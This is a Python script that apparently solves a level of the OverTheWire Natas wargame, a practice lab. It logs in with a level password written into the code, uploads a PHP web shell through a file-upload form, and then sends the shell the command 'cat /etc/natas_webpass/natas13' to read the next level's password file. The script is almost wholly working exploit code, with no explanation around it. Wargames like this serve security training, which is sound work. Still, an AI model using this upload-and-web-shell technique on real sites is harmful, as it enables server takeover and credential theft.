#!/usr/bin/env python 
'''
>>Exploit file upload functionality
'''

import requests 
import re 

r        = requests.session()
url      = "http://natas12.natas.labs.overthewire.org/"
username = "natas12"
password = "EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3"
data     = {'filename' : 'shell.php' , 'MAX_FILE_SIZE' : "1000"}
filedata = open('shell.php' , 'rb')
files    = {'uploadedfile' : filedata }
resp = r.post(url,auth = (username,password) , data = data , files = files )
upload_dir = re.findall(r'>upload.*php',resp.text)
upload_dir = upload_dir[0][1:]
shell_command = "?cmd=cat /etc/natas_webpass/natas13"
shell_url = url + upload_dir + shell_command
resp = r.get(shell_url, auth=(username,password))
print("The Key is : " + resp.text)
